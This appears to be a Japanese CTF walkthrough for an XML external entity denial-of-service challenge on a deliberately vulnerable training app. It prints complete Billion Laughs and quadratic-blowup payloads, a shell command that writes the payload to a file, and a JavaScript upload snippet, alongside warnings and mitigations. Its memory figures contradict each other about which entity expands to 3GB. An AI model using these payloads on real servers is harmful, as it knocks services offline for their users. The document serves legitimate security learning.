# XXE DoS ❌

**難易度:** ⭐⭐⭐⭐⭐
**カテゴリ:** XXE (XML External Entity)
**目標:** Billion Laughs 攻撃でサーバーの DoS を引き起こす

---

## 思考プロセス

**ステップ1: XXE Data Access との違い**
```
「XXE Data Access では外部ファイルを読み取った」
    ↓
「XXE DoS では、サーバーのリソースを枯渇させる」
    ↓
「Billion Laughs = エンティティの再帰的展開」
```

**ステップ2: Billion Laughs の原理**
```
「エンティティ lol = "lol" (3バイト)」
    ↓
「lol2 = lol を10回 = 30バイト」
    ↓
「lol3 = lol2 を10回 = 300バイト」
    ↓
「...」
    ↓
「lol9 = 約3GB のデータに展開」
    ↓
「メモリ不足でサーバーがクラッシュ」
```

## Billion Laughs ペイロード

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

## メモリ消費量の計算

| エンティティ | 展開後のサイズ |
|-------------|---------------|
| lol | 3 bytes |
| lol2 | 30 bytes (10 × lol) |
| lol3 | 300 bytes (10 × lol2) |
| lol4 | 3 KB |
| lol5 | 30 KB |
| lol6 | 300 KB |
| lol7 | 3 MB |
| lol8 | 30 MB |
| lol9 | 300 MB |
| lol10 | 3 GB |

## 実行手順

1. **攻撃用 XML ファイルを作成**
   ```bash
   cat > xxe_dos.xml << 'XMLEOF'
   <?xml version="1.0"?>
   <!DOCTYPE lolz [
     <!ENTITY lol "lol">
     <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
     <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
     <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
     <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
     <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
   ]>
   <lolz>&lol6;</lolz>
   XMLEOF
   ```

2. **XML アップロード可能なエンドポイントを特定**
   - `/#/complain` のファイルアップロード
   - DevTools で accept 属性を変更して XML を許可

3. **XML をアップロード**
   ```javascript
   // FormData で送信
   const formData = new FormData();
   formData.append('file', xmlFile, 'dos.xml');
   
   fetch('/file-upload', {
     method: 'POST',
     body: formData,
     headers: {
       'Authorization': 'Bearer ' + localStorage.getItem('token')
     }
   });
   ```

4. **サーバーの応答を確認**
   - 応答が遅延する
   - 502/503 エラー
   - サーバーがクラッシュ

## 代替ペイロード: Quadratic Blowup

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY a "AAAAAAAAAA...（大量のA）...AAAAAAAAAA">
]>
<data>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;...</data>
```

## 注意事項

```
⚠️ DoS 攻撃は本番環境では絶対に実行しないでください
⚠️ CTF/学習環境でのみ使用してください
⚠️ Docker 環境ではリソース制限により効果が限定的
```

## 検証ポイント

- [ ] XML を受け付けるエンドポイントを特定
- [ ] Billion Laughs ペイロードを作成
- [ ] アップロード/送信
- [ ] サーバーの応答遅延またはエラーを確認
- [ ] チャレンジ完了を確認

## 対策

- 外部エンティティの無効化
- エンティティ展開の制限
- XML パーサーの設定（DTD 無効化）
- 入力サイズの制限

## 関連チャレンジ

- [XXE Data Access](../difficulty-3/xxe-data-access.md) - XXE の基本
- [Deprecated Interface](../difficulty-2/deprecated-interface.md) - ファイルアップロード
- [Blocked RCE DoS](blocked-rce-dos.md) - 別の DoS 攻撃

## 解説

[未着手]
